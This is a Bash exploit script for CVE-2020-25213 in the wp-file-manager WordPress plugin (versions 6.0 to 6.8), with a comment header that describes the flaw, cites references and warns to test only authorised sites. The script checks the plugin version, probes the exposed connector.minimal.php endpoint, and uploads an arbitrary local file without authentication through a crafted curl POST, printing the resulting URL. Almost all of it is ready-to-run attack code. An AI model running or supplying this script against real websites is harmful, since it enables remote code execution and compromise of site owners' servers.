#!/bin/bash

# Exploit Title: RCE on wp-file-manager 6.0-6.8 Wordpress plugin due to connector.minimal.php.
# Date: September 4,2020
# Exploit Author: Mansoor R (@time4ster)
# CVE: CVE-2020-25213
# Version Affected: 6.0 to 6.8
# Vendor URL: https://wordpress.org/plugins/wp-file-manager/
# Patch: Upgrade to wp-file-manager 6.9
# Tested on: wp-file-manager 6.0 (https://downloads.wordpress.org/plugin/wp-file-manager.6.0.zip)

#Description:
#The core of the issue began with the File Manager plugin renaming the extension on the elFinder library’s connector.minimal.php.dist file to .php so it could be executed directly, even though the connector file was not used by the File Manager itself. Such libraries often include example files that are not intended to be used “as-is” without adding access controls, and this file had no direct access restrictions, meaning the file could be accessed by anyone. This file could be used to initiate an elFinder command and was hooked to the elFinderConnector.class.php file

#Using connector.minimal.php file attacker can upload arbitrary file to the target (unauthenticated) & thus can achieve Remote code Execution.


#Patch commit details:
# https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&new=2373068%40wp-file-manager%2Ftrunk&old=2372895%40wp-file-manager%2Ftrunk&sfp_email=&sfph_mail=

#Reference
#https://nvd.nist.gov/vuln/detail/CVE-2020-25213

#Credits:
#1. https://www.wordfence.com/blog/2020/09/700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/
#2. https://seravo.com/blog/0-day-vulnerability-in-wp-file-manager/

#contact me:
#email: time4ster@protonmail.com

##WARNINGS: 
#Only test the exploit on websites you are authorized to.
#Don't upload reverse shell payloads or any files that can cause harm to organization.
#Also note that the uploaded files can be accessed by anyone unless secured by password.


echo
echo "============================================================================================"
echo "wp-file-manager wordpress plugin Unauthenticated RCE Exploit    By: Mansoor R (@time4ster)"
echo "============================================================================================"
echo

function printHelp()
{
			echo -e "
			Usage:

			-u|--wp_url				Wordpress target url
			-f|--upload_file			Absolute location of local file to upload on the target.
			-k|--check				Only checks whether the vulnerable endpoint exists & have particular fingerprint or not. No file is uploaded.
			-v|--verbose				Also prints curl command which is going to be executed
			-h|--help				Print Help menu


			Example:
			./wp-file-manager-exploit.sh --wp_url https://www.example.com/wordpress --check
			./wp-file-manager-exploit.sh --wp_url https://wordpress.example.com/ -f /tmp/php_hello.php --verbose
			"
	}

	check="false"
	verbose="false"
	#Processing arguments
	while [[ "$#" -gt 0 ]]
	do
			key="$1"

			case "$key" in
					    -u|--wp_url)
									    wp_url="$2"
											    shift
													    shift # past argument
															    ;;
																    -f|--upload_file)
																				    upload_file="$2"
																						    shift
																								    shift
																										    ;;
																											    -k|--check)
																															    check="true"
																																	    shift
																																			    shift
																																					    ;;
																																						    -v|--verbose)
																																										    verbose="true"
																																												    shift
																																														    ;;
																																															    -h|--help)
																																																			    printHelp
																																																					    exit
																																																							    shift
																																																									    ;;
																																																										    *)   
																																																														    echo [-] Enter valid options
																																																																    exit
																																																																		    ;;
																																																															esac
																																																													done

																																																													[[ -z "$wp_url" ]] && echo "[-] Supply wordpress target URL." && exit 
																																																													[[ ! -s "$upload_file" ]] && [[ "$check" == "false" ]]  && echo "[-] Either supply --upload_file or --check" && exit

																																																													#Script have dependency on jq
																																																													jq_cmd=$(command -v jq)
																																																													[[ -z "$jq_cmd" ]] && echo -e "[-] Script have dependency on jq. Insall jq from your package manager.\nFor debian based distro install using command: apt install jq" && exit

																																																													function checkWPFileManagerVersion()
																																																													{										#Takes 1 argument: url
																																																																declare url="$1"
																																																																	declare target_endpoint="$url/wp-content/plugins/wp-file-manager/readme.txt"
																																																																		declare user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36"
																																																																			declare is_vulnerable="true"
																																																																				#declare response=$(curl -ks --max-time 5 --user-agent "$user_agent" "$target_endpoint" | grep -i "Stable tag: ")
																																																																					declare version=$( curl -ks --max-time 5 --user-agent "$user_agent" "$target_endpoint" | grep -A 5 "== Changelog ==" | grep -E -o "[0-9]\.[0-9]" | head -n 1 )
																																																																						if [ -n "$version" ];then
																																																																										#declare version=$(echo "$response" | awk {'print $3'})
																																																																												echo "[+] Found wp-file-manager version: $version"
																																																																														
																																																																														patched_version="6.9"
																																																																																#if [ $(awk 'BEGIN {print ('$version' > '6.9'}') ]; then
																																																																																		smaller_version=$(echo -e "$version\n$patched_version" | sort -n | head -n 1)
																																																																																				if [ "$version" != "$patched_version" ] && [ "$smaller_version" == "$version" ];then
																																																																																									echo "[+] Version appears to be vulnerable"
																																																																																											else
																																																																																																echo "[-] Version don't appears to be vulnerable"
																																																																																																			is_vulnerable=false
																																																																																																					fi
																																																																																																						else	echo "[-] Unable to detect version. May be wp-file-manager plugin not installed."
																																																																																																										is_vulnerable=false
																																																																																																											fi
																																																																																																												if [ "$is_vulnerable" == "false" ];
																																																																																																															then
																																																																																																																			echo -n "Do you still want to continue (y/N) : "
																																																																																																																					read choice
																																																																																																																							[[ "$choice" == "y" ]] || [[ "$choice" == "Y" ]] && echo && return
																																																																																																																									exit	
																																																																																																																										fi


																																																																																																																								}

																																																																																																																								function checkWPFileManager()
																																																																																																																								{										#Takes 1 argument: url
																																																																																																																											declare url="$1"

																																																																																																																												#Checking wp-file-manager plugin version:
																																																																																																																													checkWPFileManagerVersion "$url"

																																																																																																																														declare target_endpoint="$url/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
																																																																																																																															declare user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36"
																																																																																																																																
																																																																																																																																declare response=$(curl -ks --max-time 5 --user-agent "$user_agent" "$target_endpoint")
																																																																																																																																	#echo "$response"
																																																																																																																																		#{"error":["errUnknownCmd"]} is returned when vulnerable endpoint is hit
																																																																																																																																			declare is_vulnerable=$(echo "$response" | grep "\{\"error\":\[\"errUnknownCmd\"\]\}")
																																																																																																																																				[[ -n "$is_vulnerable" ]] && echo "[+] Target: $url is vulnerable"
																																																																																																																																					[[ -z "$is_vulnerable" ]] && echo "[-] Target: $url is not vulnerable"	
																																																																																																																																			}

																																																																																																																																			function exploitWPFileManager()
																																																																																																																																			{										#Takes 3 arguments: url & file_upload & verbose(true/false)
																																																																																																																																						declare url="$1"
																																																																																																																																							declare file_upload="$2"
																																																																																																																																								declare verbose="$3"
																																																																																																																																									declare target_endpoint="$url/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
																																																																																																																																										declare user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36"

																																																																																																																																											if [ "$verbose" == "true" ];then
																																																																																																																																															echo "curl POC :"
																																																																																																																																																	echo "curl -ks --max-time 5 --user-agent \"$user_agent\" -F \"reqid=17457a1fe6959\" -F \"cmd=upload\" -F \"target=l1_Lw\"  -F \"mtime[]=1576045135\" -F \"upload[]=@/$file_upload\" \"$target_endpoint\" "
																																																																																																																																																			echo
																																																																																																																																																				fi

																																																																																																																																																					response=$(curl -ks --max-time 5 --user-agent "$user_agent" -F "reqid=17457a1fe6959" -F "cmd=upload" -F "target=l1_Lw"  -F "mtime[]=1576045135" \
																																																																																																																																																									-F "upload[]=@/$file_upload" \
																																																																																																																																																											"$target_endpoint" )
																																																																																																																																																					       #echo "$response"
																																																																																																																																																						          file_upload_url=$(echo "$response" | jq -r .added[0].url  2>/dev/null)
																																																																																																																																																								  	[[ -n "$file_upload_url" ]] && echo -e "[+] W00t! W00t! File uploaded successfully.\nLocation:  $file_upload_url "
																																																																																																																																																										[[ -z "$file_upload_url" ]] && echo "[-] File upload failed."
																																																																																																																																																								}	


																																																																																																																																																								[[ "$check" == "true" ]] && checkWPFileManager "$wp_url"
																																																																																																																																																								[[ -s "$upload_file" ]] && exploitWPFileManager "$wp_url" "$upload_file" "$verbose"

																																																																																																																																																								echo
